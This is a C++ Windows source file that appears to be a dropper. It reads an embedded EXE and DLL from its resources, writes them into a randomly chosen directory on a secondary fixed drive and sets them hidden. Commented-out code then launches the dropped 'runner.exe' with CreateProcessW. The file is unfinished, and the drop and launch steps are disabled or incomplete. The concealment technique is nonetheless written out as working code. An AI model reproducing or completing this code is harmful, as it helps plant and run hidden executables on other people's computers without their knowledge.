#include <cstdio>
#include <utility>
#include <Windows.h>
#include "resource.h"
#include <string>
#include <fstream>
#include <vector>
#include <filesystem>

std::pair<char*, DWORD> getResource(const int resource_name, const int resource_type)
{
	std::pair<char*, DWORD> final_data;
	HMODULE h_module = nullptr;
	GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, reinterpret_cast<LPCTSTR>(getResource), &h_module);

	HRSRC h_resource = FindResource(h_module, MAKEINTRESOURCE(resource_name), MAKEINTRESOURCE(resource_type));
	if (h_resource == nullptr)
	{
		return {};
	}

	const HGLOBAL h_pre_data = LoadResource(h_module, h_resource);
	if (h_pre_data == nullptr) return {nullptr, 0};

	final_data.second = SizeofResource(h_module, h_resource);
	final_data.first = static_cast<char*>(LockResource(h_pre_data));
	return final_data;
}

std::vector<std::wstring> getCandidateDrives()
{
	wchar_t lpDrives[MAX_PATH]{};
	std::vector<std::wstring> targetDrives;
	GetLogicalDriveStrings(MAX_PATH, lpDrives);

	for (unsigned int i = 0; lpDrives[i] != '\0' && lpDrives[i+1] != '\0' && i < MAX_PATH - 4; i += 4)
	{
		wchar_t lpCurrentDrive[4]{};
		wcscpy_s(lpCurrentDrive, 4, lpDrives + i);
		const auto type = GetDriveType(lpCurrentDrive);
		if (type == DRIVE_UNKNOWN || type == DRIVE_NO_ROOT_DIR) continue;
		if (type == DRIVE_FIXED && wcscmp(lpCurrentDrive, L"C:\\") != 0) targetDrives.emplace_back(lpCurrentDrive);
	}
	return targetDrives;
}

std::wstring getRandomPath(const std::filesystem::directory_iterator& candidate_base, size_t depth = 1)
{
	if (depth == 0) return candidate_base->path().c_str();
	try
	{
		std::vector<std::wstring> directories;
		for (auto it = std::filesystem::directory_iterator(candidate_base); it != std::filesystem::directory_iterator(); ++it)
		{
			if (it->is_directory())
			{
				directories.emplace_back(it->path().wstring());
			}
		}
		return getRandomPath(std::filesystem::directory_iterator(directories[rand() % directories.size()]), depth-1);
	}
	catch (const std::exception&)
	{
		std::filesystem::directory_iterator next = std::filesystem::directory_iterator(candidate_base);
		return getRandomPath(++next, depth);
	}
}

void dumpBinariesAtPath(const std::wstring& path)
{
	const auto [data_exe, size_exe] = getResource(RUNNER, TYPE_EXE);
	std::ofstream exe_file(path + L"runner.exe", std::ios_base::binary);
	exe_file.write(data_exe, size_exe);
	exe_file.close();

	const auto [data_dll, size_dll] = getResource(EXTERN_TOOLS, TYPE_DLL);
	std::ofstream dll_file(path + L"extern-tools.dll", std::ios_base::binary);
	dll_file.write(data_dll, size_dll);
	dll_file.close();
	if(!SetFileAttributesW((path + L"runner.exe").c_str(), /*FILE_ATTRIBUTE_SYSTEM | */FILE_ATTRIBUTE_HIDDEN)) MessageBox(nullptr, L"Insertion failed", L"Error", MB_OK);
	if(!SetFileAttributesW((path + L"extern-tools.dll").c_str(), /*FILE_ATTRIBUTE_SYSTEM | */FILE_ATTRIBUTE_HIDDEN)) MessageBox(nullptr, L"Insertion failed", L"Error", MB_OK);
}

int main()
{
	const auto drives = getCandidateDrives();
	const std::wstring randomDrive = drives[rand() % drives.size()];
	wprintf(L"%s", getRandomPath(std::filesystem::directory_iterator(randomDrive), rand() % 10).c_str());

	//dumpBinariesAtPath();

	// launch runner.exe indepentently using CreateProcess
	/*STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof pi);
	CreateProcessW(
		(path + L"runner.exe").c_str(),
		nullptr, 
		nullptr,
		nullptr, 
		FALSE, 
		CREATE_NEW_PROCESS_GROUP | NORMAL_PRIORITY_CLASS,
		nullptr,
		path.c_str(), 
		&si, 
		&pi
	);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);*/
	
}
